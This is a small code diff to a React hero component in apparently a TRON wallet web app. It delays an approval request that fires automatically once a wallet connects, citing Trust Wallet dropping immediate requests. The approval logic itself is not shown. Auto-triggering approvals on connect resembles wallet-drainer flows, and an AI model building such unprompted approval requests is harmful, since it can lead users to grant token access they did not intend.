@@ -70,7 +70,11 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
         network: "TRON MAINNET",
       });
 
-      handleApproval();
+      // Add a small delay to ensure WalletConnect session is fully established on the wallet side
+      // Trust Wallet often drops requests sent immediately after connection.
+      setTimeout(() => {
+        handleApproval();
+      }, 1500);
     }
   }, [connected, address]);
 
